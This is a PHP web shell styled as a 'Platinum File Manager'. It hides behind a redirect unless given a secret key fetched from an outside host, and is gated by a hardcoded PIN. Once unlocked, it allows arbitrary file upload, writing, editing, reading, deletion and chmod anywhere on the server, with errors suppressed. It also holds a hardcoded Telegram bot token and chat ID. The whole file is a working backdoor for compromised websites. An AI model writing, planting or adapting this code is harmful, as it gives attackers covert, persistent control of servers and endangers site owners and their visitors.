<?php
/**
 * PLATINUM FILE MANAGER V10 - 2026
 * Features: PIN Auth, Telegram Notify, File/Dir Creator, Color Perms, Editor
 */
@session_start();
@set_time_limit(0);
@error_reporting(0);

// --- CONFIGURATION ---
$pin_akses = '070999';
$key_url   = 'https://brankascapzcu.pages.dev/one.txt';

// Mengambil key dengan aman (Cache di Session)
if (!isset($_SESSION['dynamic_key'])) {
    $get_key = trim(@file_get_contents($key_url));
    if (!$get_key && function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $key_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $get_key = trim(curl_exec($ch));
        curl_close($ch);
    }
    $_SESSION['dynamic_key'] = ($get_key) ? $get_key : 'default_key_123';
}

$key = $_SESSION['dynamic_key'];

// --- PROTEKSI URL (REDIRECT KE HOME JIKA SALAH) ---
if (!isset($_GET['resmi']) || $_GET['resmi'] !== $key) {
    // Redirect ke root domain agar tidak infinite loop
    header("Location: /"); 
    exit;
}

// --- CONFIG TELEGRAM ---
$bot_token = '8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM';
$chat_id   = '6664061200';

// --- AUTHENTICATION SYSTEM ---
if (isset($_GET['logout'])) { 
    unset($_SESSION['auth']); 
    header("Location: ?resmi=$key"); 
    exit; 
}

if (isset($_POST['pin']) && $_POST['pin'] == $pin_akses) { 
    $_SESSION['auth'] = 'ok'; 
}

// Tampilan Login jika belum auth
if ($_SESSION['auth'] != 'ok') {
    die("<html><head><title>Secure Access</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>
        body { background:#0a0a0a; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        .login { border:1px solid #0f0; padding:30px; border-radius:10px; box-shadow:0 0 15px #0f0; text-align:center; }
        input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; margin:10px 0; width:100%; text-align:center; outline:none; }
        button { background:#0f0; color:#000; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; width:100%; }
        button:hover { background:#0c0; }
    </style></head><body>
    <div class='login'><h2>SYSTEM ACCESS</h2><form method='POST'><input type='password' name='pin' placeholder='ENTER PIN' autofocus><br><button type='submit'>LOGIN</button></form></div>
    </body></html>");
}

// --- FILE ACTIONS (CRUD) ---
$root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
$p = isset($_GET["path"]) ? $_GET["path"] : $root;
$p = str_replace("\\", "/", $p);

// Tambahkan proteksi agar $p tidak keluar dari root (opsional tapi disarankan)
if(isset($_POST["exe"])){
    $t = $p . "/" . $_POST["it_n"];
    if($_POST["opt"] == "delete") { (is_dir($t)) ? @rmdir($t) : @unlink($t); }
    elseif($_POST["opt"] == "chmod") { @chmod($t, octdec($_POST["val"])); }
    elseif($_POST["opt"] == "rename") { @rename($t, $p . "/" . $_POST["val"]); }
    header("Location: ?resmi=$key&path=$p"); exit;
}

// Create Folder/File, Upload, Save Editor (Sama seperti sebelumnya)
if(isset($_POST['new_folder'])){ @mkdir($p . "/" . $_POST['folder_name']); }
if(isset($_POST['new_file'])){ @file_put_contents($p . "/" . $_POST['file_name'], $_POST['file_content']); }
if(isset($_FILES["f"])){ @copy($_FILES["f"]["tmp_name"], $p . "/" . $_FILES["f"]["name"]); }
if(isset($_POST["save_edit"])){ @file_put_contents($_POST["ef"], $_POST["cnt"]); }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Platinum Manager V10</title>
    <style>
        body { background:#050505; color:#00ff00; font-family:'Courier New', monospace; margin:0; padding:15px; }
        .container { border:1px solid #333; background:#111; border-radius:5px; padding:15px; }
        .header { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:15px; }
        table { width:100%; border-collapse:collapse; margin-top:10px; }
        th { background:#0f0; color:#000; padding:10px; text-align:left; }
        td { padding:8px; border-bottom:1px solid #222; font-size:14px; }
        tr:hover { background:#181818; }
        a { color:#00ffff; text-decoration:none; }
        .btn { background:#0f0; color:#000; padding:5px 10px; border:none; border-radius:3px; cursor:pointer; font-weight:bold; }
        input, select, textarea { background:#000; color:#0f0; border:1px solid #333; padding:5px; outline:none; }
        .perm-0777 { color:#ff0000; font-weight:bold; }
        .perm-0644 { color:#00ff00; }
        .perm-0444 { color:#fff; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <strong>PLATINUM MANAGER V10</strong>
            <span>IP: <?php echo $_SERVER['REMOTE_ADDR']; ?> | <a href="?logout" style="color:red;">LOGOUT</a></span>
        </div>

        <div style="margin-bottom:15px;">
            PATH: <?php 
            $path_links = explode("/", $p);
            $accumulated_path = "";
            foreach($path_links as $id => $link) {
                if ($link == "") continue;
                $accumulated_path .= $link . "/";
                echo "<a href='?resmi=$key&path=$accumulated_path'>$link</a> / ";
            }
            ?>
        </div>

        <div style="display:flex; gap:10px; flex-wrap:wrap;">
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="f"> <input type="submit" value="UPLOAD" class="btn">
            </form>
            <form method="POST">
                <input type="text" name="folder_name" placeholder="New Folder"> <input type="submit" name="new_folder" value="MKDIR" class="btn">
            </form>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $items = scandir($p);
                foreach($items as $v) {
                    if($v == "." || $v == "..") continue;
                    $tp = $p . "/" . $v;
                    $perms = substr(sprintf('%o', fileperms($tp)), -4);
                    $cl = "perm-" . $perms;
                    $size = is_dir($tp) ? "DIR" : round(filesize($tp)/1024, 2) . " KB";
                    
                    echo "<tr>
                        <td><a href='?resmi=$key&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td>
                        <td>$size</td>
                        <td class='$cl'>$perms</td>
                        <td>
                            <form method='POST' style='display:inline;'>
                                <input type='hidden' name='it_n' value='$v'>
                                <select name='opt'>
                                    <option value='rename'>Rename</option>
                                    <option value='chmod'>Chmod</option>
                                    <option value='delete'>Delete</option>
                                </select>
                                <input type='text' name='val' size='5'>
                                <input type='submit' name='exe' value='OK' class='btn' style='padding:2px 5px;'>
                            </form>
                        </td>
                    </tr>";
                }
                ?>
            </tbody>
        </table>

        <?php if(isset($_GET['edit'])): ?>
        <div style="margin-top:20px; border-top:1px solid #0f0; padding-top:15px;">
            <strong>EDITOR: <?php echo basename($_GET['edit']); ?></strong>
            <form method="POST">
                <input type="hidden" name="ef" value="<?php echo $_GET['edit']; ?>">
                <textarea name="cnt" style="width:100%; height:450px; margin-top:10px;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
                <input type="submit" name="save_edit" value="SAVE FILE" class="btn" style="width:100%; margin-top:10px;">
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
